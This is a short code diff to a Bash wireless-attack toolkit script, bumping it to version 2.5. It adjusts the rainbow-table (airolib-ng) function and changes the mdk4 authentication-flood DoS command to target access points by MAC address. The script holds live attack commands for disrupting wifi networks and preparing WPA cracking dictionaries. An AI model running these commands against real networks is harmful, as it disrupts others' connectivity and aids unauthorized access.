@@ -381,7 +381,9 @@ fuerza_rainbow() {
 }
 #[8] Attack with airolib for the creation of precomputed dictionaries
 rainbowtaibles() {
+	tput civis
 	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Tables..."; sleep 2
+	tput cnorm
 	echo -ne "\n${blueColour}[?]$grayColour Dictionary path: " && read ruta
 	sudo airolib-ng dicc-hashed --import passwd $ruta > /dev/null 2>&1
 	test -f dicc-hashed
@@ -574,9 +576,9 @@ dosattack() {
 	tput civis; clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
 	xterm -e "airodump-ng ${tar}" &
 	dosairdump_PID=$!
-	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
+	echo -ne "\n$greenColour[?]$grayColour Select a network (MAC): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
-	sudo mdk4 $tar a -e $redos
+	sudo mdk4 $tar a -a $redos
 	echo -ne "\n\n${greenColour}[+]$grayColour Enter to continue" && read
 }
 #[4] Beacon flood attack with mdk
@@ -963,7 +965,7 @@ else
 	tput civis; clear
 	echo -e "${turquoiseColour}"
 	banner
-	echo -e "\n${greenColour}[+]${grayColour} Version 2.2"
+	echo -e "\n${greenColour}[+]${grayColour} Version 2.5"
 	echo -e "${greenColour}[+]${grayColour} Github: https://github.com/Kidd3n"
 	echo -e "${greenColour}[+]${grayColour} Discord ID: Kidden#9079"
 	echo -e "${greenColour}[+]${grayColour} Instagram: kidd3n.sh"
